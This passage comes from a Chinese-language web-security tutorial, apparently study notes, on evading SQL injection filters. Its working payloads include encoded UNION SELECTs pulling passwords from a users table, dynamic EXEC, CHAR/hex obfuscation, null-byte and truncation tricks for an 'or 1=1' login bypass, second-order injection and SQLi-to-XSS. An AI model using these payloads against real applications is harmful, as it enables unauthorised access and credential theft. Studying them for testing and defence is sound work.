&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token string&#34;&gt;&#39;%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/tblUsers%252f%252a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/&#39;&lt;/span&gt;admin&#39;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;也能使用Unicode编码&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/ada02281ca6c2ec5917209ee31ddf0fe.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://images.dadream.eu.org/images/2024/07/53fabfd7b23b29dcc9b7671b125d1d16.png&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;使用动态查询执行&#34;&gt;&lt;a href=&#34;#使用动态查询执行&#34; class=&#34;headerlink&#34; title=&#34;使用动态查询执行&#34;&gt;&lt;/a&gt;使用动态查询执行&lt;/h4&gt;&lt;p&gt;过滤器阻止了想注入的查询，那么可以使用动态执行来避开该过滤器。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;mssql&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT password FROM tblUsers&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;oracle&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; pw VARCHAR2&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE &lt;span class=&#34;token string&#34;&gt;&#39;SELECT password FROM tblUsers&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; pw&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
DBMS_OUTPUT&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;PUT_LINE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;pw&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;使用字符串操作函数将过滤器允许的输入转换成一个包含所需查询的字符串&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;Oracle: &lt;span class=&#34;token string&#34;&gt;&#39;SEL&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ECT&#39;&lt;/span&gt;
MS&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SQL&lt;/span&gt;: &lt;span class=&#34;token string&#34;&gt;&#39;SEL&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ECT&#39;&lt;/span&gt;
MySQL: &lt;span class=&#34;token string&#34;&gt;&#39;SEL&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;ECT&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#URL中分别将它们编码成％2b(+)和％20( )&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;oracle使用chr()，ms-sql使用char()，还能用来绕过引号&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;83&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;76&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;69&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;67&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;CHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;84&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oracle中的REVERSE、TRANSLATE、REPLACE 和SUBSTR函数。&lt;/p&gt;
&lt;p&gt;ms-sql，使用16进制实例化字符串&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@query&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@query&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x53454c4543542070617373776f72642046524f4d2074626c5573657273&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;使用空字节&#34;&gt;&lt;a href=&#34;#使用空字节&#34; class=&#34;headerlink&#34; title=&#34;使用空字节&#34;&gt;&lt;/a&gt;使用空字节&lt;/h4&gt;&lt;p&gt;空字节之所以能起作用，是因为原生代码(native code)和托管代码分别采用不同的方法来处理空字节。在原生代码中，根据字符串起始位置到出现第一个空字节的位置来确定字符串长度 (空字节有效终止了字符串)。而在托管代码中，字符串对象包含一个字符数组(可能包含空字节) 和一条单独的字符串长度记录。&lt;/p&gt;
&lt;p&gt;要想执行空字节攻击，只需在过滤器阻止的字符前面提供一个采用URL编码的空字节 (%00)即可。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;UNION SELECT password FROM tblUsers WHERE username= &#39;&lt;/span&gt;admin&#39;&lt;span class=&#34;token comment&#34;&gt;-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;嵌套剥离后的表达式（双字绕过）&#34;&gt;&lt;a href=&#34;#嵌套剥离后的表达式（双字绕过）&#34; class=&#34;headerlink&#34; title=&#34;嵌套剥离后的表达式（双字绕过）&#34;&gt;&lt;/a&gt;嵌套剥离后的表达式（双字绕过）&lt;/h4&gt;&lt;p&gt;有些审查过滤器会先从用户输入中剥离特定的字符或表达式，然后再按照常用的方式处理剩下的数据。如果被剥离的表达式中包含两个或多个字符，就不会递归应用过滤器。&lt;/p&gt;
&lt;p&gt;如果从输入中剥离了 SQL关键词SELECT&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;SELSELECTECT&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;利用截断&#34;&gt;&lt;a href=&#34;#利用截断&#34; class=&#34;headerlink&#34; title=&#34;利用截断&#34;&gt;&lt;/a&gt;利用截断&lt;/h4&gt;&lt;p&gt;审查过滤器通常会对用户提供的数据执行多种操作，有时这些操作中会包括将输入截断成最大的长度(可能是为了尽力阻止缓冲区溢出攻击)或者调整数据使其位于拥有预定义最大长度的数据库字段内。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#条件：对引号标记进行双重编码，使用两个单引号(&#34;)替换所有的单引号(&#39;)，将每一项截断成16个字符&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; uid &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;admin&#34;-- &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;AND&lt;/span&gt; password &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#执行不成功&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#利用上述条件，注入15个a和一个单引号&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; uid &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;aaaaaaaaaaaaaaa&#39;&#39; AND password =&#39;&#39;
#第三个单引号干扰了语法，后面无效
&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#利用第二个注入点闭合单引号，并注入永真条件&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; uid &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; username &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;aaaaaaaaaaaaaaa&#39;&#39; AND password = &#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;-- &#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;避开自定义过滤器&#34;&gt;&lt;a href=&#34;#避开自定义过滤器&#34; class=&#34;headerlink&#34; title=&#34;避开自定义过滤器&#34;&gt;&lt;/a&gt;避开自定义过滤器&lt;/h4&gt;&lt;p&gt;遇到各种奇怪绝妙的输入过滤器，可以通过发挥想象力来避开这些过滤器。&lt;/p&gt;
&lt;p&gt;例如，包名加双引号，编码替换，加标签&lt;/p&gt;
&lt;h4 id=&#34;使用非标准入口点&#34;&gt;&lt;a href=&#34;#使用非标准入口点&#34; class=&#34;headerlink&#34; title=&#34;使用非标准入口点&#34;&gt;&lt;/a&gt;使用非标准入口点&lt;/h4&gt;&lt;p&gt;通常WAF不会验证参数名，可以注入SQL代码到参数名中，如果参数名被处理成SQL查询就能执行，同理，也能注入到HTTP头中等等&lt;/p&gt;
&lt;h3 id=&#34;利用二阶SQL注入&#34;&gt;&lt;a href=&#34;#利用二阶SQL注入&#34; class=&#34;headerlink&#34; title=&#34;利用二阶SQL注入&#34;&gt;&lt;/a&gt;利用二阶SQL注入&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;攻击者在HTTP请求中提交某种经过构思的输入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;应用程序存储该输入(通常保存在数据库中)以便后面使用并响应请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;攻击者提交第二个(不同的)请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;为处理第二个请求，应用程序会检索己经存储的输入并处理，从而导致攻击者注入的 SQL查询被执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果可行的话，会在应用程序对第二个请求的响应中向攻击者返回查询结果。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;a&lt;span class=&#34;token string&#34;&gt;&#39;+@@version+&#39;&lt;/span&gt;a
&lt;span class=&#34;token comment&#34;&gt;#注入这个参数值，经过处理得到&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; tblContacts &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&#39;+@@version+&#39;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;foo@example.org,....
&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#单引号被转化为双引号&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; tblUsers &lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; contactld &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#检索已存在的细节信息&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;UPDATE&lt;/span&gt; tblUsers
&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; name&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;@&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;address&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;52 Throwley Way&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;WHERE&lt;/span&gt; contactld &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#使用上面测试过的字符串注入引号双重编码&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#当查看更新后的信息时，@@version就会执行显示在屏幕&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;寻找二阶漏洞&#34;&gt;&lt;a href=&#34;#寻找二阶漏洞&#34; class=&#34;headerlink&#34; title=&#34;寻找二阶漏洞&#34;&gt;&lt;/a&gt;寻找二阶漏洞&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在筹划好应用程序的内容和功能后进行复查，寻找所有用户能够控制的数据项，这些数据项会被应用程序持久保存并被后面的功能重用。单独操作每个数据项并为每个实例执行接下来的步骤。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在数据项中提交一个简单的值，数据项在SQL查询中被不安全地使用时很可能会引发问题，例如，单引号或者使用单引号引起来的字母数字型字符串。如有必要，请快速检查所有包含多个阶段的过程（比如用户注册）以保证数据值完全持久地存在于应用程序中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果发现应用程序的输入过滤器阻止了输入，绕过&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;快速检查应用程序中所有存在显式使用数据项的功能以及可能存在隐式使用数据项的功能。寻找所有能够表明是由输入引发了问题的异常行为，比如数据库错误消息、HTTP 500 状态代码、更隐秘的错误消息、受损的功能、丢失或毁坏的数据等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;对于识别出来的每个潜在问题，尝试开发一种概念验证攻击来确认是否存在SQL注入漏洞。请注意，有缺陷的持久数据可能以间接受到攻击的方式（例如，整型转换错误或后续数据验证失败）来引发异常条件。使用两个引号标识来提供相同的输入并查看异常是否消失。 使用数据库专用的结构（比如字符串连接函数和版本标识）来确认正在修改SQL查询。如果异常条件是盲的（例如，不返回查询结果或任何错误消息），使用时间延迟技术来确认漏洞的存在。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;防御&#34;&gt;&lt;a href=&#34;#防御&#34; class=&#34;headerlink&#34; title=&#34;防御&#34;&gt;&lt;/a&gt;防御&lt;/h4&gt;&lt;p&gt;对所有可变数据项使用参数化，白名单&lt;/p&gt;
&lt;h3 id=&#34;客户端SQL注入漏洞&#34;&gt;&lt;a href=&#34;#客户端SQL注入漏洞&#34; class=&#34;headerlink&#34; title=&#34;客户端SQL注入漏洞&#34;&gt;&lt;/a&gt;客户端SQL注入漏洞&lt;/h3&gt;&lt;h4 id=&#34;访问本地数据库&#34;&gt;&lt;a href=&#34;#访问本地数据库&#34; class=&#34;headerlink&#34; title=&#34;访问本地数据库&#34;&gt;&lt;/a&gt;访问本地数据库&lt;/h4&gt;&lt;p&gt;为了更快的加载数据，以及离线使用，有时会把数据库放在本地&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-javascript&#34; data-language=&#34;javascript&#34;&gt;&lt;code class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//JavaScript创建一个本地数据库&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; database &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;openDatabase&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;dbStatus&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;1.0&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Status updates&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;500000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; db&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;transaction&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;tx&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
tx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeSql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;CREATE TABLE IF NOT EXISTS tblUpdates (id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, date VARCHAR(20), user VARCHAR(50), status VARCHAR(IOO))&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
tx&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;executeSql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;INSERT INTO tblUpdates (date, user, status) VALUES (&#39;1/8/2012&#39;,&#39;Me&#39;,&#39;I am writing a book.&#39;)&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;攻击客户端数据库&#34;&gt;&lt;a href=&#34;#攻击客户端数据库&#34; class=&#34;headerlink&#34; title=&#34;攻击客户端数据库&#34;&gt;&lt;/a&gt;攻击客户端数据库&lt;/h4&gt;&lt;p&gt;要发送客户端SQL注入攻击，攻击者必须识别出一些他能控制的数据片段，并且应用程序以非安全方式将这些数据片段存储在其他用户的客户端数据库中。&lt;/p&gt;
&lt;p&gt;如果这些客户端数据库存在同步，能到达其他数据库执行，则可以注入SQL查询&lt;/p&gt;
&lt;p&gt;场景&lt;/p&gt;
&lt;p&gt;在社交网络应用程序中，在Web邮件应用程序中，在实现拍卖功能的应用程序中，攻击者可以控制的基于文本的数据，在屏幕上输入的但是受到输入验证程序支配的数据&lt;/p&gt;
&lt;h3 id=&#34;使用混合攻击&#34;&gt;&lt;a href=&#34;#使用混合攻击&#34; class=&#34;headerlink&#34; title=&#34;使用混合攻击&#34;&gt;&lt;/a&gt;使用混合攻击&lt;/h3&gt;&lt;p&gt;利用多种漏洞混合攻击&lt;/p&gt;
&lt;h4 id=&#34;利用捕获的数据&#34;&gt;&lt;a href=&#34;#利用捕获的数据&#34; class=&#34;headerlink&#34; title=&#34;利用捕获的数据&#34;&gt;&lt;/a&gt;利用捕获的数据&lt;/h4&gt;&lt;p&gt;利用SQL注入读取权限，账户，口令&lt;/p&gt;
&lt;h4 id=&#34;创建跨站脚本&#34;&gt;&lt;a href=&#34;#创建跨站脚本&#34; class=&#34;headerlink&#34; title=&#34;创建跨站脚本&#34;&gt;&lt;/a&gt;创建跨站脚本&lt;/h4&gt;&lt;p&gt;在SQL注入不能回显时，可以注入反射XSS来返回输出&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;https:&lt;span class=&#34;token comment&#34;&gt;//www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,&#39;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#39;,1&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;#测试xss,如果没有过滤就会执行成功&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

